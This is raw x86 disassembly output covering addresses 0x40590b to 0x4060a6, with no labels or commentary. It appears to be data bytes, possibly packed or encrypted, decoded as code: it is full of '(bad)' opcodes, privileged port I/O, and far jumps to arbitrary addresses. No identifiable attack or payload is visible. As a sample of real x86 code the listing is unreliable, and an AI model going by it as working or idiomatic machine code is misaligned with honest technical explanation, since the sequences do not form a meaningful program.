  40590b:	adc    al,0xcf
  40590e:	push   ebp
  40590f:	in     eax,0x57
  405911:	out    dx,al
  405912:	fwait
  405913:	add    cl,BYTE PTR [ebp-0x6c]
  405916:	adc    ch,BYTE PTR [edx-0x483eb477]
  40591c:	adc    al,0x20
  40591e:	out    dx,al
  40591f:	push   ecx
  405920:	jbe    0x40592f
  405922:	aas    
  405923:	or     al,dl
  405925:	fmul   DWORD PTR [ecx]
  405927:	sub    cl,BYTE PTR [ebx]
  405929:	ror    DWORD PTR [eax],1
  40592b:	in     al,dx
  40592c:	jge    0x40596e
  40592e:	dec    ebp
  40592f:	push   ebp
  405930:	cmp    bl,BYTE PTR [eax+eax*2]
  405933:	fwait
  405934:	jbe    0x40598c
  405936:	sub    al,0xd4
  405938:	sbb    BYTE PTR [eax+0x77c67e84],bh
  40593e:	add    BYTE PTR cs:[esi+esi*8+0x3a],bh
  405943:	push   ebp
  405944:	(bad)  
  405946:	jb     0x40597e
  405948:	call   0xddfc:0xe7685541
  40594f:	dec    edx
  405950:	push   0x66f15b0c
  405955:	push   0xf615558b
  40595a:	sub    al,dh
  40595c:	jp     0x4059c4
  40595e:	or     al,0x1
  405960:	sub    BYTE PTR [edx+0x45],dh
  405963:	in     al,0xe8
  405965:	in     eax,0x6b
  405967:	lea    ecx,[edx+edi*2-0x596093f5]
  40596e:	fld    QWORD PTR [ebx]
  405970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405971:	ins    BYTE PTR es:[edi],dx
  405972:	jmp    0xe8245224
  405977:	(bad)  
  405978:	push   esi
  405979:	jns    0x4059ae
  40597b:	icebp  
  40597c:	out    0x71,eax
  40597e:	cmp    DWORD PTR [eax-0x7b024817],edx
  405984:	cld    
  405985:	mov    dl,0x70
  405987:	jns    0x4059c4
  405989:	iret   
  40598a:	push   0x67f10ed0
  40598f:	(bad)  
  405990:	cmp    esp,DWORD PTR [ecx-0x418d72a6]
  405996:	mov    eax,ds:0x6f79c65b
  40599b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40599c:	mov    dl,0x8e
  40599e:	xchg   BYTE PTR [edi+0x44],ah
  4059a1:	lods   eax,DWORD PTR ds:[esi]
  4059a2:	daa    
  4059a3:	sbb    eax,0xc25d04e2
  4059a8:	mov    eax,DWORD PTR [ebp+ebp*4-0x37]
  4059ac:	sar    DWORD PTR [ecx-0x3b40ed74],cl
  4059b2:	xor    al,0x50
  4059b4:	mov    cl,0xa5
  4059b6:	repnz adc esi,DWORD PTR [ebx+0x17cda4bf]
  4059bd:	js     0x40598d
  4059bf:	aaa    
  4059c0:	jne    0x405a3d
  4059c2:	hlt    
  4059c3:	adc    BYTE PTR [edi+0x3a],ah
  4059c6:	sub    eax,0xf49066a1
  4059cb:	adc    al,0x50
  4059cd:	jge    0x405a2b
  4059cf:	sub    BYTE PTR [ebx-0x59bde64b],cl
  4059d5:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4059d7:	sbb    ah,ah
  4059d9:	jbe    0x405a27
  4059db:	test   BYTE PTR [ecx],0xd9
  4059de:	xor    esi,0xffffff9f
  4059e1:	stos   DWORD PTR es:[edi],eax
  4059e2:	int    0xda
  4059e4:	or     edx,ecx
  4059e6:	push   0xffffffe3
  4059e8:	mov    ch,0x98
  4059ea:	aad    0xc8
  4059ec:	sub    esi,DWORD PTR [edi+0x16fb7ff1]
  4059f2:	leave  
  4059f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059f4:	mov    bh,0xe3
  4059f6:	call   0xbc261bbe
  4059fb:	sub    eax,DWORD PTR [esp+ecx*4+0x56]
  4059ff:	push   ebp
  405a00:	pop    edi
  405a01:	cmp    al,BYTE PTR [edi+0x4ddc365e]
  405a07:	xchg   dh,dl
  405a09:	mov    dh,0xdd
  405a0b:	fmul   st(1),st
  405a0d:	mov    dh,0x28
  405a0f:	outs   dx,BYTE PTR ds:[esi]
  405a10:	xchg   DWORD PTR [esi+edi*2],eax
  405a13:	sbb    BYTE PTR [edi-0x58],dh
  405a16:	jo     0x4059e9
  405a18:	sub    DWORD PTR [ecx+0x65da8916],eax
  405a1e:	sub    DWORD PTR [esp+ebp*2],edx
  405a21:	ja     0x405a5d
  405a23:	retf   
  405a24:	lds    esi,FWORD PTR [ebx]
  405a26:	arpl   dx,ax
  405a28:	loop   0x405a15
  405a2a:	mov    DWORD PTR ds:0x1d7abc6c,eax
  405a30:	mov    ebx,0x86529634
  405a35:	es push ds
  405a37:	call   0x7c8c:0x9e41c40d
  405a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a40:	clc    
  405a41:	xor    edx,DWORD PTR [eax-0x902738f]
  405a47:	out    0x6c,eax
  405a49:	sub    eax,0xe093d960
  405a4e:	das    
  405a4f:	rol    DWORD PTR [ebx-0x48b1cef9],cl
  405a55:	out    0x76,eax
  405a57:	sbb    cl,bl
  405a59:	xor    bh,BYTE PTR [edi+0x7e]
  405a5c:	xchg   BYTE PTR [eax],dl
  405a5e:	(bad)  
  405a5f:	jo     0x405a20
  405a61:	gs fadd st,st(0)
  405a64:	push   cs
  405a65:	xchg   ebp,eax
  405a66:	jl     0x405a71
  405a68:	in     eax,dx
  405a69:	pop    ds
  405a6a:	in     al,0xbe
  405a6c:	jge    0x405a16
  405a6e:	or     ecx,DWORD PTR [eax+0x9820bc2]
  405a74:	sar    dl,0x1f
  405a77:	cs dec esp
  405a79:	xor    al,0x59
  405a7b:	pop    eax
  405a7c:	add    esi,edx
  405a7e:	sub    bl,BYTE PTR [esi+esi*4-0x2e622340]
  405a85:	fmul   DWORD PTR [eax]
  405a87:	not    DWORD PTR [ecx+eax*8+0x23]
  405a8b:	cmp    BYTE PTR [esi+0x5d56c350],bl
  405a91:	jne    0x405a67
  405a93:	push   ebp
  405a94:	cld    
  405a95:	adc    DWORD PTR [eax+ebx*8+0x28],ecx
  405a99:	retf   
  405a9a:	xor    eax,0xafbc78d7
  405a9f:	pop    es
  405aa0:	push   esi
  405aa1:	(bad)  
  405aa2:	loopne 0x405a72
  405aa4:	cli    
  405aa5:	jg     0x405a98
  405aa7:	int3   
  405aa8:	imul   dh
  405aaa:	outs   dx,BYTE PTR ds:[esi]
  405aab:	add    bl,dl
  405aad:	sub    DWORD PTR [edx-0x69fbb11c],ecx
  405ab3:	arpl   WORD PTR [eax+0x56],di
  405ab6:	sbb    al,BYTE PTR [bp+di]
  405ab9:	adc    eax,0xa38a61ff
  405abe:	jecxz  0x405a8d
  405ac0:	sub    eax,0xb2c16f5d
  405ac5:	test   al,0x2d
  405ac7:	lock add DWORD PTR [esi],edx
  405aca:	popa   
  405acb:	cmp    eax,0x39fa83eb
  405ad0:	int    0xf8
  405ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ad3:	mov    cl,0x75
  405ad5:	(bad)  
  405ad6:	push   ecx
  405ad7:	sbb    al,BYTE PTR [ebp-0x1b791532]
  405add:	sub    dh,bh
  405adf:	rol    DWORD PTR [edi+ebx*1+0x208f5ce4],1
  405ae6:	push   ecx
  405ae7:	pop    ss
  405ae8:	mov    edi,0x677cdf75
  405aed:	retf   
  405aee:	add    al,0xdf
  405af0:	adc    dl,BYTE PTR [edi-0x2b1d6271]
  405af6:	mov    bh,0xf5
  405af8:	push   ecx
  405af9:	lods   al,BYTE PTR ds:[esi]
  405afa:	mov    ebp,0x5f6d7445
  405aff:	mov    dl,0xf3
  405b01:	lods   eax,DWORD PTR ds:[esi]
  405b02:	bound  ebp,QWORD PTR [ebp+edx*2+0x4fec982e]
  405b09:	mov    ah,0xfd
  405b0b:	mov    dh,0xf9
  405b0d:	test   al,0x6a
  405b0f:	jmp    0x4fb507fc
  405b14:	xchg   DWORD PTR [edi],eax
  405b16:	sbb    al,0x9
  405b18:	pop    ss
  405b19:	xchg   ecx,eax
  405b1a:	ins    DWORD PTR es:[edi],dx
  405b1b:	int    0x79
  405b1d:	xchg   edi,eax
  405b1e:	fmulp  st(1),st
  405b20:	adc    BYTE PTR [esi],0xb1
  405b23:	mov    al,ds:0xb5aa8b2d
  405b28:	adc    ah,ch
  405b2a:	je     0x405b22
  405b2c:	imul   esp,DWORD PTR [ebx],0xb7ef46e6
  405b32:	and    edx,DWORD PTR [esi-0x77]
  405b35:	stos   DWORD PTR es:[edi],eax
  405b36:	in     eax,dx
  405b37:	ja     0x405b50
  405b39:	push   ecx
  405b3a:	jns    0x405b7c
  405b3c:	neg    DWORD PTR [eax]
  405b3e:	cmp    cl,BYTE PTR [edx]
  405b40:	cmp    DWORD PTR [esi-0x618024fd],esi
  405b46:	fist   WORD PTR [esi-0x1]
  405b49:	fcomip st,st(2)
  405b4b:	enter  0x964e,0xce
  405b4f:	ins    DWORD PTR es:[edi],dx
  405b50:	xor    BYTE PTR [edi-0x5babe49e],dl
  405b56:	mov    edi,0x60fdf943
  405b5b:	add    ebx,edi
  405b5d:	mov    edi,0x3e921038
  405b62:	bound  eax,QWORD PTR [eax]
  405b64:	stos   DWORD PTR es:[edi],eax
  405b65:	test   eax,0x18b3901b
  405b6a:	mov    ds:0xe7a7d447,al
  405b6f:	cmp    DWORD PTR [esi+0x41],eax
  405b72:	push   cs
  405b73:	mov    edx,0xddb0459d
  405b78:	scas   al,BYTE PTR es:[edi]
  405b79:	adc    BYTE PTR [ecx-0x2f],0x57
  405b7d:	fld    TBYTE PTR [edx]
  405b7f:	pop    edx
  405b80:	mov    BYTE PTR [edx-0x6b],bh
  405b83:	aam    0x3c
  405b85:	mov    esi,fs
  405b87:	gs sbb ah,bh
  405b8a:	add    al,dh
  405b8c:	sahf   
  405b8d:	inc    ecx
  405b8e:	(bad)  
  405b8f:	clc    
  405b90:	and    DWORD PTR [ecx],esp
  405b92:	push   0x5b16bb34
  405b97:	mov    ah,0x3e
  405b99:	jae    0x405b69
  405b9b:	out    dx,eax
  405b9c:	add    al,0x1a
  405b9e:	pop    ecx
  405b9f:	sub    ebx,DWORD PTR [ecx-0x24]
  405ba2:	out    dx,eax
  405ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ba4:	adc    ah,BYTE PTR [ebx+0x16]
  405ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ba8:	cmp    BYTE PTR [esi+0x386f73ca],dh
  405bae:	test   eax,0xf83bdc64
  405bb3:	lods   al,BYTE PTR ds:[esi]
  405bb4:	push   eax
  405bb5:	mov    cl,0x79
  405bb7:	outs   dx,BYTE PTR ds:[esi]
  405bb8:	add    eax,0x33f8ad3e
  405bbd:	cmp    eax,0x445ba230
  405bc2:	sbb    BYTE PTR [edx-0x3e],bh
  405bc5:	pop    ebx
  405bc6:	inc    edi
  405bc7:	arpl   WORD PTR [ecx+0x4e1c67ca],dx
  405bcd:	test   al,0xe6
  405bcf:	xchg   DWORD PTR [edi+0x58fe506c],ebp
  405bd5:	out    dx,eax
  405bd6:	mov    ch,0x5
  405bd8:	pop    ecx
  405bd9:	(bad)  
  405bda:	(bad)  
  405bdb:	arpl   si,di
  405bdd:	hlt    
  405bde:	test   eax,0x4f9c5e8b
  405be3:	add    DWORD PTR [ebx],edx
  405be5:	and    DWORD PTR [eax],esi
  405be7:	xchg   edx,eax
  405be8:	or     ecx,DWORD PTR [edi+0x6e8685e1]
  405bee:	inc    ebp
  405bef:	shl    ebp,0xc3
  405bf2:	or     bl,BYTE PTR [edx*2+0x720214c5]
  405bf9:	fcomp  QWORD PTR [ecx-0x6]
  405bfc:	add    al,0xe5
  405bfe:	dec    esp
  405bff:	inc    esi
  405c00:	sbb    ecx,DWORD PTR [edx-0x750105c]
  405c06:	xchg   ebp,eax
  405c07:	push   ebp
  405c08:	add    eax,0xb095e387
  405c0d:	out    dx,eax
  405c0e:	addr16 inc edi
  405c10:	xchg   BYTE PTR [edx-0x8],ah
  405c13:	cwde   
  405c14:	xchg   ebx,eax
  405c15:	ret    
  405c16:	bound  edi,QWORD PTR [ebx+0x7a]
  405c19:	stos   BYTE PTR es:[edi],al
  405c1a:	jle    0x405c1e
  405c1c:	clc    
  405c1d:	cli    
  405c1e:	cmp    ebp,DWORD PTR [ebp+esi*8+0x2b]
  405c22:	idiv   DWORD PTR [edi-0xeca940a]
  405c28:	cmp    al,0xea
  405c2a:	xor    dl,BYTE PTR fs:[ebx-0x51a512e3]
  405c31:	sub    BYTE PTR [edx+0x6d8f49e3],ch
  405c37:	mov    DWORD PTR [ebp+0xad0d129],ebp
  405c3d:	pop    eax
  405c3e:	jnp    0x405cb4
  405c40:	mov    bh,0xd6
  405c42:	xor    ebp,DWORD PTR es:[ebx+0x64]
  405c46:	inc    edi
  405c47:	dec    ebp
  405c48:	xlat   BYTE PTR ds:[ebx]
  405c49:	sahf   
  405c4a:	pop    ecx
  405c4b:	push   ecx
  405c4c:	int    0xc3
  405c4e:	inc    DWORD PTR [esi]
  405c50:	mov    edx,0x13037da1
  405c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c56:	mov    ebp,0x61ac7bac
  405c5b:	(bad)
  405c5f:	mov    gs,eax
  405c61:	aad    0x3e
  405c63:	or     ah,BYTE PTR [esi-0x5d97001d]
  405c69:	loope  0x405c98
  405c6b:	xor    al,0x85
  405c6d:	sub    al,0xd0
  405c6f:	data16 xor BYTE PTR [edx-0x63aec38b],bl
  405c76:	mov    ds:0xd5118df0,eax
  405c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c7c:	add    al,0xfc
  405c7e:	dec    ebp
  405c7f:	add    DWORD PTR [ecx+0x3f],0x6ad25d7e
  405c86:	push   edi
  405c87:	mov    cs,WORD PTR [esi]
  405c89:	mov    dh,BYTE PTR [ecx]
  405c8b:	rcr    BYTE PTR [edi],1
  405c8d:	add    BYTE PTR [ebp+0x273c4076],0xb
  405c94:	les    esp,FWORD PTR [ebx-0x55d2341d]
  405c9a:	pop    ss
  405c9b:	repnz stos DWORD PTR es:[edi],eax
  405c9d:	frstor [edx+edx*2]
  405ca0:	sub    al,ah
  405ca2:	(bad)  
  405ca3:	mov    bl,0x21
  405ca5:	in     al,dx
  405ca6:	sub    dl,BYTE PTR [ebp+ebx*2+0x244f0482]
  405cad:	jecxz  0x405c97
  405caf:	or     al,0x8f
  405cb1:	lahf   
  405cb2:	stc    
  405cb3:	dec    ecx
  405cb4:	cmp    DWORD PTR [esi+0x28],edi
  405cb7:	inc    eax
  405cb8:	xor    bl,BYTE PTR [eax+eax*8-0x7e]
  405cbc:	mov    edx,0xc8ac6b32
  405cc1:	aam    0x8d
  405cc3:	and    ebx,ebp
  405cc5:	push   cs
  405cc6:	xlat   BYTE PTR ds:[ebx]
  405cc7:	mov    edx,DWORD PTR [ebx-0x34]
  405cca:	and    esp,DWORD PTR [edi]
  405ccc:	cdq    
  405ccd:	jge    0x405d41
  405ccf:	sbb    BYTE PTR [eax-0x29],ch
  405cd2:	dec    ecx
  405cd3:	lea    ebp,[ecx]
  405cd5:	or     bh,ch
  405cd7:	add    DWORD PTR [ebx-0x35],0x2a648845
  405cde:	dec    esi
  405cdf:	fcom   QWORD PTR [edx]
  405ce1:	sbb    DWORD PTR [eax],ebx
  405ce3:	mov    esi,gs
  405ce5:	fisubr WORD PTR [ebx-0xa87c270]
  405ceb:	adc    cl,al
  405ced:	mov    BYTE PTR [eax+0x1e],bl
  405cf0:	retf   0xd05b
  405cf3:	mul    BYTE PTR [edx-0x3268b026]
  405cf9:	add    al,0x33
  405cfb:	dec    edi
  405cfc:	xor    dl,BYTE PTR [ebx+ecx*4-0x1d]
  405d00:	loope  0x405d50
  405d02:	ins    BYTE PTR es:[edi],dx
  405d03:	mov    ebx,0x10404f54
  405d08:	xor    cl,BYTE PTR [edi+ebp*8+0x43850520]
  405d0f:	mov    dh,0x4e
  405d11:	pop    ds
  405d12:	add    cl,BYTE PTR [edx-0x2680316a]
  405d18:	stc    
  405d19:	push   cs
  405d1a:	retf   
  405d1b:	shl    DWORD PTR [esi],cl
  405d1d:	cmp    eax,0xe27a4267
  405d22:	adc    BYTE PTR [esi+0x7c],dl
  405d25:	push   esp
  405d26:	jle    0x405d2c
  405d28:	aad    0x13
  405d2a:	int3   
  405d2b:	jle    0x405d95
  405d2d:	xchg   dh,bh
  405d2f:	adc    eax,0x47862c6c
  405d34:	fwait
  405d35:	mov    al,ds:0xd2e70a78
  405d3a:	lods   eax,DWORD PTR ds:[esi]
  405d3b:	es cdq 
  405d3d:	leave  
  405d3e:	mov    esp,0x91a988a5
  405d43:	jmp    eax
  405d45:	mov    esp,0x83a9b3d
  405d4a:	adc    eax,0xfa64dd0f
  405d4f:	sar    BYTE PTR [eax+0x4523f12d],cl
  405d55:	test   eax,0x3e8fda55
  405d5a:	test   BYTE PTR [edi],al
  405d5c:	mov    ss,WORD PTR [esi+0x9]
  405d5f:	ffree  st(4)
  405d61:	fld    DWORD PTR [ecx]
  405d63:	xor    al,0x8f
  405d65:	cwde   
  405d66:	push   cs
  405d67:	rcr    BYTE PTR [esi],0xc0
  405d6a:	sbb    eax,0x34de23c4
  405d6f:	dec    ebp
  405d70:	fst    QWORD PTR [ebx+ebx*4]
  405d73:	push   esp
  405d74:	loopne 0x405dc6
  405d76:	mov    edx,DWORD PTR [ebx+0x2870a364]
  405d7c:	sub    BYTE PTR [edx+0x5a],ch
  405d7f:	push   edx
  405d80:	cmp    al,0x29
  405d82:	popf   
  405d83:	sub    al,0x51
  405d85:	es mov ah,0xb0
  405d88:	addr16 int3 
  405d8a:	cli    
  405d8b:	cmp    eax,eax
  405d8d:	imul   esp,DWORD PTR [esi+0x81eddcc],0xffffff90
  405d94:	inc    ecx
  405d95:	xchg   esi,eax
  405d96:	jmp    0x9afb2182
  405d9b:	sahf   
  405d9c:	xchg   DWORD PTR [ecx],ecx
  405d9e:	(bad)  
  405d9f:	into   
  405da0:	mov    ah,0x71
  405da2:	and    BYTE PTR [eax+0x71],bh
  405da5:	xchg   edi,eax
  405da6:	mov    esi,0xd22b6602
  405dab:	addr16 pop ebp
  405dad:	cs repz popf 
  405db0:	bound  esi,QWORD PTR [ebx+ebp*4-0x2b]
  405db4:	inc    esi
  405db5:	sbb    DWORD PTR [ecx-0x6e019e9d],esp
  405dbb:	stos   DWORD PTR es:[edi],eax
  405dbc:	ds xchg esp,eax
  405dbe:	arpl   bp,sp
  405dc0:	dec    edx
  405dc1:	neg    DWORD PTR [eax]
  405dc3:	mov    eax,ebp
  405dc5:	ins    WORD PTR es:[edi],dx
  405dc7:	or     eax,0x8c5ae27
  405dcc:	dec    ecx
  405dcd:	sub    eax,0x959a85dc
  405dd2:	ds clc 
  405dd4:	(bad)  
  405dd6:	cmc    
  405dd7:	and    al,BYTE PTR ds:[edx+ebp*4-0x48ef126]
  405ddf:	dec    esp
  405de0:	ins    DWORD PTR es:[edi],dx
  405de1:	jns    0x405dee
  405de3:	(bad)  
  405de4:	mov    al,0xc7
  405de6:	adc    al,0xa4
  405de8:	scas   eax,DWORD PTR es:[edi]
  405de9:	sub    DWORD PTR [ebp+0x328c6a0a],eax
  405def:	leave  
  405df0:	cli    
  405df1:	mov    ah,0x92
  405df3:	add    BYTE PTR [edx+0x13],al
  405df6:	loope  0x405dfc
  405df8:	les    esi,FWORD PTR [ebx]
  405dfa:	mov    al,ds:0xc1f68a12
  405dff:	dec    ecx
  405e00:	call   0x8995:0x650717cd
  405e07:	xchg   ebp,eax
  405e08:	mov    DWORD PTR ds:0x5fa3fe49,0x7447a86e
  405e12:	aam    0x11
  405e14:	push   0xe79ddd0e
  405e19:	lods   eax,DWORD PTR ds:[esi]
  405e1a:	jo     0x405e5c
  405e1c:	stc    
  405e1d:	and    al,0xf3
  405e1f:	fwait
  405e20:	das    
  405e21:	js     0x405df3
  405e23:	ret    0x4452
  405e26:	mov    eax,DWORD PTR [edx+0x1a]
  405e29:	shr    ah,0x52
  405e2c:	jp     0x405dde
  405e2e:	mov    edx,0x39d41b89
  405e33:	mov    ebp,0x74ec22c4
  405e38:	outs   dx,BYTE PTR ds:[esi]
  405e39:	and    al,0xb9
  405e3b:	xchg   esp,eax
  405e3c:	sbb    bh,BYTE PTR [esi]
  405e3e:	adc    al,0xcf
  405e40:	inc    esi
  405e41:	rcr    BYTE PTR [edi-0x6d628441],1
  405e47:	lods   al,BYTE PTR ds:[esi]
  405e48:	(bad)  
  405e49:	dec    ebx
  405e4a:	cmp    DWORD PTR [esi],edx
  405e4c:	(bad)  
  405e4d:	push   edx
  405e4e:	inc    esi
  405e4f:	(bad)  
  405e50:	scas   eax,DWORD PTR es:[edi]
  405e51:	jecxz  0x405e61
  405e53:	lods   eax,DWORD PTR ds:[esi]
  405e54:	jl     0x405ddc
  405e56:	jl     0x405de0
  405e58:	scas   al,BYTE PTR es:[edi]
  405e59:	jo     0x405e34
  405e5b:	bound  edi,QWORD PTR ds:0x73d504ac
  405e61:	fs in  eax,dx
  405e63:	clc    
  405e64:	test   DWORD PTR [eax+0x6f0c8ece],esp
  405e6a:	nop
  405e6b:	mov    dl,0x8d
  405e6d:	mov    ds:0x1475ee9f,al
  405e72:	xor    al,0xf3
  405e74:	sbb    dl,BYTE PTR [ebx-0x7766d504]
  405e7a:	int    0x26
  405e7c:	jg     0x405e8b
  405e7e:	lea    edi,[ebx+ecx*8]
  405e81:	and    BYTE PTR [edi+0x5cb8fc2a],0x18
  405e88:	je     0x405eba
  405e8a:	adc    BYTE PTR ds:0x38990264,bl
  405e90:	(bad)  
  405e91:	jb     0x405e60
  405e93:	and    ebx,DWORD PTR [eax+0x74330b95]
  405e99:	push   0xffffffcd
  405e9b:	fistp  WORD PTR [ecx+0x6c]
  405e9e:	push   0xddea99f9
  405ea3:	mov    eax,ds:0xf67c9439
  405ea8:	imul   eax,DWORD PTR [edi-0x4d],0xa3c2de56
  405eaf:	mov    ds:0x1ba74b38,al
  405eb4:	xor    edx,ebx
  405eb6:	std    
  405eb7:	xchg   DWORD PTR [edi],eax
  405eb9:	das    
  405eba:	gs dec ebp
  405ebc:	rol    BYTE PTR [eax],0x71
  405ebf:	cmp    ebp,DWORD PTR [edi+edi*8+0xf]
  405ec3:	push   esi
  405ec4:	xchg   esp,eax
  405ec5:	data16 (bad) 
  405ec7:	jmp    0x405f25
  405ec9:	mov    DWORD PTR [esp+ebx*8-0x17],ecx
  405ecd:	push   ebx
  405ece:	loope  0x405f4c
  405ed0:	ret    
  405ed1:	dec    esi
  405ed2:	jne    0x405eaa
  405ed4:	aas    
  405ed5:	ja     0x405f45
  405ed7:	dec    ebp
  405ed8:	int    0xcd
  405eda:	sbb    al,0xd3
  405edc:	and    eax,0x1b5efb3
  405ee1:	xchg   esp,eax
  405ee2:	test   eax,0xa6b96218
  405ee7:	pop    edx
  405ee8:	and    eax,0x6f7d2db8
  405eed:	je     0x405e79
  405eef:	jb     0x405f67
  405ef1:	mov    esi,0x61aa24c5
  405ef6:	fild   WORD PTR [eax]
  405ef8:	pusha  
  405ef9:	push   ebp
  405efa:	out    0xb5,eax
  405efc:	fdivr  DWORD PTR ds:0xec1cb099
  405f02:	dec    esp
  405f03:	xchg   esp,eax
  405f04:	mov    ds:0x55b0b49a,eax
  405f09:	cld    
  405f0a:	jb     0x405f15
  405f0c:	lahf   
  405f0d:	(bad)  [ebx+0x50]
  405f10:	aaa    
  405f11:	imul   esp,DWORD PTR [ecx+0x79e3ac56],0xffffff93
  405f18:	cld    
  405f19:	adc    al,0x42
  405f1b:	fs mov edx,0x6225f8b2
  405f21:	in     al,0xec
  405f23:	xchg   ebx,eax
  405f24:	cmp    al,0x2
  405f26:	dec    ebx
  405f27:	mov    esp,0xba425427
  405f2c:	inc    DWORD PTR ds:0x4ebee597
  405f32:	cmp    al,0x31
  405f34:	lods   eax,DWORD PTR ds:[esi]
  405f35:	bound  esp,QWORD PTR [edi+0x7b]
  405f38:	mov    eax,0x5c054bbd
  405f3d:	shr    ebx,cl
  405f3f:	lea    esp,[ebx+0x31]
  405f42:	out    0xaa,eax
  405f44:	dec    eax
  405f45:	dec    edi
  405f46:	adc    ebp,eax
  405f48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f49:	arpl   WORD PTR [edi+ebp*2],dx
  405f4c:	popf   
  405f4d:	pop    ecx
  405f4e:	jmp    0x9d5378d9
  405f53:	mov    ah,0xdf
  405f55:	add    ch,BYTE PTR [ebp+0x3c]
  405f58:	mov    bl,0x52
  405f5a:	and    DWORD PTR [ebp-0x4],edx
  405f5d:	into   
  405f5e:	stos   BYTE PTR es:[edi],al
  405f5f:	pop    ebx
  405f60:	arpl   WORD PTR [edi+edx*2-0x787ffadc],sp
  405f67:	mov    dh,0xcb
  405f69:	(bad)  
  405f6a:	aas    
  405f6b:	push   ecx
  405f6c:	mov    ah,0x94
  405f6e:	xlat   BYTE PTR ds:[ebx]
  405f6f:	mov    ebx,DWORD PTR [edx]
  405f71:	push   DWORD PTR [ecx-0x39fe2433]
  405f77:	mov    ?,WORD PTR [ecx]
  405f79:	add    BYTE PTR [esi],dl
  405f7b:	add    DWORD PTR [edi+0x2a],0x6d5a6c32
  405f82:	mov    ch,0x8a
  405f84:	out    0x5b,al
  405f86:	(bad)  
  405f87:	pop    edi
  405f88:	xchg   esp,eax
  405f89:	xor    DWORD PTR [ebx+0x1a],0x24
  405f8d:	inc    ebp
  405f8e:	(bad)  
  405f8f:	jne    0x405ff2
  405f91:	cs int 0x8
  405f94:	cld    
  405f95:	cmp    edx,esi
  405f97:	in     al,dx
  405f98:	dec    ebp
  405f99:	jb     0x405fab
  405f9b:	sub    eax,0xfa03b464
  405fa0:	(bad)  
  405fa1:	adc    edx,DWORD PTR [ecx]
  405fa3:	leave  
  405fa4:	in     eax,dx
  405fa5:	push   esp
  405fa6:	push   edx
  405fa7:	lods   eax,DWORD PTR ds:[esi]
  405fa8:	int    0xe7
  405faa:	jno    0x405fff
  405fac:	inc    esp
  405fad:	shr    ah,0xf
  405fb0:	mov    esp,0x87eb907b
  405fb5:	add    DWORD PTR cs:[edi-0x1e],eax
  405fb9:	or     bh,BYTE PTR [edi]
  405fbb:	mov    ds:0x841707f5,eax
  405fc0:	imul   edx,DWORD PTR [ebp+0x7da26e8e],0xffffffb1
  405fc7:	nop
  405fc8:	jbe    0x40601b
  405fca:	and    edi,eax
  405fcc:	repnz cld 
  405fce:	cmc    
  405fcf:	cmp    BYTE PTR [edx],0x90
  405fd2:	jmp    0xabb3baff
  405fd7:	fisubr DWORD PTR [ebp+0x1]
  405fda:	inc    esi
  405fdb:	jp     0x405fa0
  405fdd:	xchg   esp,eax
  405fde:	test   al,0xf9
  405fe0:	mov    WORD PTR [eax-0x7e],gs
  405fe3:	sub    BYTE PTR [ebx+0x4ad11b79],al
  405fe9:	test   al,0xe6
  405feb:	pop    ebx
  405fec:	cmp    al,BYTE PTR [esi+0x3c8edf0f]
  405ff2:	(bad)  
  405ff5:	inc    esi
  405ff6:	lods   al,BYTE PTR ds:[esi]
  405ff7:	mov    ds:0xc6272d75,al
  405ffc:	inc    edi
  405ffd:	(bad)  
  405ffe:	xchg   ecx,eax
  405fff:	test   eax,0xf5b7aa00
  406004:	add    ecx,DWORD PTR [ebp+0x1f1de114]
  40600a:	inc    ebx
  40600b:	mov    esi,0x82465063
  406010:	push   cs
  406011:	call   0x4b32:0x743b9b54
  406018:	or     ebp,DWORD PTR [ecx]
  40601a:	pop    ecx
  40601b:	mov    cl,0x26
  40601d:	jb     0x40607a
  40601f:	xchg   esi,eax
  406020:	push   eax
  406021:	into   
  406022:	jno    0x405ffd
  406024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406025:	sub    eax,0x2494be7f
  40602a:	int    0x7d
  40602c:	leave  
  40602d:	(bad)  
  406030:	test   DWORD PTR [edi+0x695b86c8],eax
  406036:	std    
  406037:	out    0xa0,al
  406039:	pop    ds
  40603a:	xor    al,0xe6
  40603c:	cmp    al,bh
  40603e:	or     DWORD PTR [esi+0x4fa0529c],esi
  406044:	inc    edx
  406045:	mov    BYTE PTR [edx+0x38],bl
  406048:	in     eax,0xbb
  40604a:	frstor [ecx]
  40604c:	clc    
  40604d:	pop    edx
  40604e:	dec    ebp
  40604f:	adc    al,0x7b
  406051:	add    DWORD PTR [esi],edi
  406053:	fstp   TBYTE PTR [ecx-0x3c]
  406056:	jno    0x405fe2
  406058:	mov    cl,0x73
  40605a:	inc    eax
  40605b:	jmp    0x3c96:0x6f9ea3a9
  406062:	rcl    DWORD PTR [edx],cl
  406064:	ds dec ecx
  406066:	je     0x40607a
  406068:	into   
  406069:	mov    ds:0xeb5a2467,al
  40606e:	dec    edi
  40606f:	fiadd  WORD PTR [ecx+ebx*1]
  406072:	pop    DWORD PTR [ecx+0x51]
  406075:	mov    ch,0xd6
  406077:	fnsave [ebx+0x745fc734]
  40607d:	or     al,0x3b
  40607f:	inc    esi
  406080:	test   ax,0xdbcc
  406084:	cwde   
  406085:	dec    esp
  406086:	jbe    0x4060ac
  406088:	into   
  406089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40608a:	jbe    0x4060cc
  40608c:	test   al,0x66
  40608e:	mov    edi,0xe8076ad5
  406093:	and    DWORD PTR [edi+0x19],esp
  406096:	pop    edi
  406097:	xchg   esp,eax
  406098:	xchg   ebx,eax
  406099:	push   eax
  40609a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40609b:	sub    eax,0x35e700e6
  4060a0:	xchg   edx,eax
  4060a1:	out    0x25,eax
  4060a3:	nop
  4060a4:	adc    DWORD PTR [edi],ecx
  4060a6:	repz cmp edi,DWORD PTR [eax+0x9216b52]
